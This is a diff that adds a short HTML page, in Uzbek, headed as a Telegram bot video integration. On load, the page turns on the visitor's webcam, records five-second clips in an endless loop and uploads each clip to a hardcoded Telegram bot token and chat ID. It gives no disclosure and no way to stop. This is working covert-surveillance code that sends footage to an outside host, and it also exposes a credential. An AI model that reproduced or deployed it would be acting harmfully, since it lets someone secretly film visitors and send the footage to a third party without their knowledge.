@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Telegram Bot Video Integration</title>
+</head>
+<body> 
+  <video id="video" width="640" height="480" autoplay></video>
+
+  <script>
+    var video = document.getElementById('video');
+    var mediaRecorder;
+    var recordedChunks = [];
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function (stream) {
+        video.srcObject = stream;
+        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+
+        mediaRecorder.ondataavailable = function (event) {
+          if (event.data.size > 0) {
+            recordedChunks.push(event.data);
+          }
+        };
+
+        mediaRecorder.onstop = function () {
+          var blob = new Blob(recordedChunks, { type: 'video/mp4' });
+          sendVideo(blob);
+          recordedChunks = []; // Reset recorded chunks for the next recording
+        };
+
+        setInterval(function () {
+          if (mediaRecorder.state === "recording") {
+            mediaRecorder.stop();
+          }
+          mediaRecorder.start();
+        }, 5000); // Record video segments of 60 seconds
+      })
+      .catch(function (error) {
+        console.log('Error: ' + error);
+      });
+
+    function sendVideo(blob) {
+      var botToken = '6824723033:AAGp5vLJnkuFgnLT9Xrrsy1nNea8ECRcDdw'; // Telegram bot tokeningizni kiritin
+      var chatId = '7149602547'; // Kanalingiz/userning ID raqamini kiritin (masalan: mychannel yoki -123456)
+
+      var telegramForm = new FormData();
+      telegramForm.append('chat_id', chatId);
+      telegramForm.append('video', blob, 'video.mp4');
+      telegramForm.append('caption', 'Yangi video'); // Jo'natilayotgan videoga tegishli matn
+
+      var telegramXhr = new XMLHttpRequest();
+      telegramXhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendVideo');
+      telegramXhr.send(telegramForm);
+    }
+  </script>
+</body>
+</html>
